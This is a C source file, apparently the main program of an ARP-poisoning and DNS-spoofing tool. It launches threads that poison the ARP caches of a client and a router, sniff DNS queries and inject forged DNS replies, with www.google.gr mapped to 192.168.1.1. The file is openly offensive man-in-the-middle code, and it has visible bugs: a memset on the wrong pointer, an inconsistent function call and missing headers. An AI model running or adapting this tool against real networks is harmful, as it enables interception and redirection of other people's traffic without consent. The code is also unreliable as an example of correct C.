#include <stdio.h>
#include <stdlib.h>
#include "injector.h"
#include "sniffer.h"
#include "protocols/arp.h"
#include "protocols/dns.h"

int main(int argc, char *argv[])
{
    register int  i;
    pthread_t   t[6];
    int         res;
    char        *domains[3];

    if ( argc == 1 )
    {
        fprintf(stderr, "Usage: %s interface\n", argv[0]);
        return -1;
    }
    
    //arp request
    t[0] = InjectorInit(argv[1], ETH_P_ARP, GeneralArpRequest, sizeof(struct
                ether_arp), 0, NULL, -1);

    //analyze arp
    t[1] = SnifferInit(argv[1], ETH_P_ARP, AnalyzeArp, sizeof(struct
                ether_arp), 0, NULL, -1);
    
    //send arp reply
    t[2] = InjectorInit(argv[1], ETH_P_ARP, ClientArpPoisoning,
            sizeof(struct ether_arp), 0, NULL, -1);
    
    t[3] = InjectorInit(argv[1], ETH_P_ARP, RouterArpPoisoning, 
            sizeof(struct ether_arp), 0, NULL, -1);
      
    domains[0] = malloc(30 * sizeof(char));
    memset(domains, '\0', 30);
    memcpy(domains[0], "www.google.gr", 13);
    domains[1] = malloc(16 * sizeof(char));
    memset(domains[1], '\0', 16);
    memcpy(domains[1], "192.168.1.1", 11);
    domains[2] = NULL;
    //capture dns requests
    t[4] = SnifferInit(argv[1], ETH_P_ALL, AnalyzeDns, sizeof(struct
                dnshdr), 0, NULL, -1);
    
    t[5] = InjectorInit(argv[1], ETH_P_ALL, DnsResponse, sizeof(struct 
                dnshdr), 0, t[4]);

    for ( i = 0; i < 6; i++ )
    {
        if ((res = pthread_join(t[i], NULL)) != 0)
            perror("pthread_join");
    }
    
    return 0;
}

